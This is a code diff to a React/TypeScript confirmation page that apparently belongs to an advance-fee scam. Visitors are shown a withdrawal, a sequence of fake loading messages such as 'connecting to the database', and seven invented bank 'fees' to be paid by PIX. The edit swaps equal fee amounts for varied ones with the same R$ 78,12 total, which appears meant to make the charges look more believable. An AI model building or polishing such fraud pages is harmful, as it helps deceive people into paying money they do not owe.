@@ -16,14 +16,16 @@ const bancoNomes: Record<string, string> = {
 };
 
 const taxas = [
-  "Taxa de Registro Bancario",
-  "Taxa de Liberacao de Sistema",
-  "Taxa de Validacao Financeira",
-  "Taxa de Processamento",
-  "Taxa de Seguranca Digital",
-  "Taxa de Autenticacao",
-  "Taxa Administrativa",
+  { nome: "Taxa de Registro Bancario", valor: 18.90 },
+  { nome: "Taxa de Liberacao de Sistema", valor: 14.50 },
+  { nome: "Taxa de Validacao Financeira", valor: 9.80 },
+  { nome: "Taxa de Processamento", valor: 11.20 },
+  { nome: "Taxa de Seguranca Digital", valor: 7.90 },
+  { nome: "Taxa de Autenticacao", valor: 6.40 },
+  { nome: "Taxa Administrativa", valor: 9.42 },
 ];
+
+const TOTAL_TAXAS = taxas.reduce((sum, t) => sum + t.valor, 0);
 
 const loadingMessages = [
   "Conectando ao banco de dados...",
@@ -31,9 +33,6 @@ const loadingMessages = [
   "Consultando sistema financeiro...",
   "Preparando liberacao...",
 ];
-
-const TOTAL_TAXAS = 78.12;
-const VALOR_TAXA = (TOTAL_TAXAS / 7).toFixed(2).replace(".", ",");
 
 type Step = "saque" | "loading-taxas" | "taxas" | "loading-pix" | "pix";
 
@@ -199,15 +198,15 @@ export default function Confirmacao() {
                     className={`flex items-center justify-between py-2.5 ${i < taxas.length - 1 ? "border-b border-[#F0F0F0]" : ""}`}
                     data-testid={`taxa-item-${i}`}
                   >
-                    <span className="text-sm text-[#444]">{taxa}</span>
-                    <span className="text-sm font-semibold text-[#222]">R$ {VALOR_TAXA}</span>
+                    <span className="text-sm text-[#444]">{taxa.nome}</span>
+                    <span className="text-sm font-semibold text-[#222]">R$ {taxa.valor.toFixed(2).replace(".", ",")}</span>
                   </div>
                 ))}
               </div>
 
               <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-6" data-testid="total-taxas">
                 <p className="text-sm text-[#6F6F6F] mb-1">Total a pagar:</p>
-                <h3 className="text-2xl font-bold text-[#EC008C]">R$ 78,12</h3>
+                <h3 className="text-2xl font-bold text-[#EC008C]">R$ {TOTAL_TAXAS.toFixed(2).replace(".", ",")}</h3>
               </div>
 
               <Button
